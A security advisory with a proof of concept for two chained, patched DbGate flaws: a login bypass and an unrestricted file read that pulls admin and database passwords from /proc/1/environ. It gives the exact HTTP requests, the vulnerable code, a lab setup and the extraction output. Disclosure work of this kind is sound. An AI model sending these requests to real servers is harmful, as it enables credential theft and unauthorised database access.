# DBGate Credential Disclosure (5.4.0 - 6.1.4)

DbGate 5.4.0 through 6.1.4 allows an unauthenticated attacker to read any file on the server — including `/proc/1/environ` which contains the admin password and all database credentials in plaintext — by chaining two vulnerabilities:

1. **Authentication bypass** — `LoginsProvider.login()` returns a valid JWT when a non-existent username is sent without a password, because `undefined == undefined` passes the password check
2. **Arbitrary file read via `files/load-from`** — the `loadFrom` controller accepts a `filePath` parameter and reads any file on the filesystem with `fs.readFile(filePath)`, returning the content as text with no path validation

The result is **full credential extraction with zero credentials**: admin password, all database passwords, database usernames, and internal hostnames — in a single automated attack taking under 2 seconds. Both vulnerabilities are patched in current versions.



<br/>

### Details

**Authentication bypass (undefined == undefined)**

Introduced in v5.4.0 (commit `c3fe20b6f`, 2024-07-26). Fixed in v6.1.5 (commit `86736c289`, 2025-02-04).

On DbGate 5.4.0–6.1.4, sending a login request with a non-existent username and no password field:

```
POST /auth/login
{"amoid": "logins", "user": "ghost"}
```

The `LoginsProvider.login()` function compares the submitted password against `process.env[LOGIN_PASSWORD_${login}]`. When the user does not exist, the env var is `undefined`. Since no password was sent, the submitted password is also `undefined`. The comparison `undefined == undefined` evaluates to `true`, and a valid JWT is returned.

Vulnerable code (from `authProvider.js`):
```javascript
if (password == process.env[`LOGIN_PASSWORD_${login}`]) {
  return { accessToken: jwt.sign({ login }, getTokenSecret(), ...) };
}
```

Fixed code (v6.1.5):
```javascript
if (password && password == process.env[`LOGIN_PASSWORD_${login}`]) {
```

**Arbitrary file read via files/load-from**

Introduced in v5.0.0 (commit `32e4e3625`, 2022-05-19). Fixed in v6.5.0 (commit `3f37b2b72`, 2025-06-12).

The `loadFrom` function in the files controller reads any file using a user-supplied `filePath` parameter:

```javascript
loadFrom_meta: true,
async loadFrom({ filePath, format }, req) {
    const text = await fs.readFile(filePath, { encoding: 'utf-8' });
    return deserialize(format, text);
}
```

When `format` is `"text"`, the content is returned as-is. There is no path validation, no directory restriction, and no permission check on the `filePath` parameter.

In v6.5.0, this was gated behind `if (!platformInfo.isElectron) return false`, restricting it to the desktop Electron app.

**Reading /proc/1/environ**

In Docker containers, `/proc/1/environ` contains the environment variables of PID 1 (the main process), separated by null bytes. Since DbGate's Docker deployment passes credentials via environment variables (`LOGINS`, `LOGIN_PASSWORD_admin`, `PASSWORD_con1`, etc.), this single file contains every secret in plaintext:

```
POST /files/load-from
{"filePath": "/proc/1/environ", "format": "text"}

Response (null bytes replaced with newlines):
  LOGIN_PASSWORD_admin=SuperSecretPassword123
  PASSWORD_con1=dbpassword
  USER_con1=dbuser
  SERVER_con1=sectest-mysql
  LOGINS=admin
  ...
```



<br/>

### PoC

The PoC can be run against a test environment using Docker Compose:

```yaml
services:
  sectest-dbgate:
    image: dbgate/dbgate:6.1.4-alpine
    ports:
      - "80:3000"
    environment:
      LOGINS: admin
      LOGIN_PASSWORD_admin: SuperSecretPassword123
      WEB_ROOT: /
      CONNECTIONS: con1
      LABEL_con1: MySQL
      SERVER_con1: sectest-mysql
      USER_con1: dbuser
      PASSWORD_con1: dbpassword
      PORT_con1: 3306
      ENGINE_con1: mysql@dbgate-plugin-mysql

  sectest-mysql:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: rootpass
      MYSQL_DATABASE: testdb
      MYSQL_USER: dbuser
      MYSQL_PASSWORD: dbpassword
```

Running the PoC (unauthenticated, DbGate 5.4.0–6.1.4):

```bash
python3 poc.py -t http://localhost
```

Expected output:

```
  ┌────────────────────────────────────────────────────────┐
  │  DBGate 5.4.0-6.1.4 Unauthenticated Credential PoC     │
  │                                                        │
  │  V1  auth bypass  (undefined == undefined)             │
  │  V2  arbitrary file read  (files/load-from)            │
  │                                                        │
  │  Both vulnerabilities PATCHED (V1: 6.1.5, V2: 6.5.0)   │
  └────────────────────────────────────────────────────────┘
  Target : http://localhost:80

    [*] API endpoint : http://localhost:80

[Phase 1] Reconnaissance (unauthenticated)
    [+] Version      : 6.1.4
    [+] Docker       : True
    [+] Data dir     : /root/.dbgate
    [+] Auth         : Login & Password

[Phase 2] Authentication bypass — V1 (undefined == undefined)
    [*] Sending login request WITHOUT password field
    [+] Bypassed with non-existent user 'ghost'
    [+] JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhbW9pZCI6ImxvZ2lucyI...

[Phase 3] Credential extraction — V2 (files/load-from)
    [*] Reading /proc/1/environ (contains ALL env vars in Docker)
    [+] Extracted 17 environment variables

    ┌─────────────────────────────────────────────────────┐
    │  CREDENTIALS FROM /proc/1/environ                   │
    ├─────────────────────────────────────────────────────┤
    │  LOGINS                =  admin                     │
    │  LOGIN_PASSWORD_admin  =  SuperSecretPassword123    │
    │  PASSWORD_con1         =  dbpassword                │
    │  USER_con1             =  dbuser                    │
    └─────────────────────────────────────────────────────┘


[+] Credential extraction complete
```



<br/>

### Impact

- **Full admin password extraction** — `/proc/1/environ` contains `LOGIN_PASSWORD_admin` in plaintext, giving the attacker complete administrative access to the DbGate instance
- **All database credential extraction** — `PASSWORD_con*`, `USER_con*`, `SERVER_con*` environment variables expose every configured database connection's credentials, enabling direct database access
- **Arbitrary file read** — any file readable by the Node.js process can be exfiltrated, including `/etc/shadow`, `/etc/passwd`, application configuration, and source code

**Attack chain**: Two POST requests (auth bypass → file read) extract every credential on the server in under 2 seconds with no user interaction.

**Vulnerabilities used (both patched):**
| Vuln | Description | Introduced | Fixed |
|------|-------------|------------|-------|
| V1 | Auth bypass: `undefined == undefined` in password check | v5.4.0 (2024-07-26) | v6.1.5 (2025-02-04) |
| V2 | Arbitrary file read via `files/load-from` (no path validation) | v5.0.0 (2022-05-19) | v6.5.0 (2025-06-12) |

**Affected versions:** DbGate 5.4.0 through 6.1.4 (Docker images confirmed: 5.4.0, 5.4.1–5.5.6, 6.0.0, 6.1.0–6.1.4)
**Not affected:** DbGate < 5.4.0 (auth bypass not present); DbGate >= 6.6.1 (both vulns patched; no Docker images exist for 6.1.5–6.5.x)
**Fixed in:** Auth bypass fixed in v6.1.5 (commit `86736c289`); file read restricted to Electron in v6.5.0 (commit `3f37b2b72`)
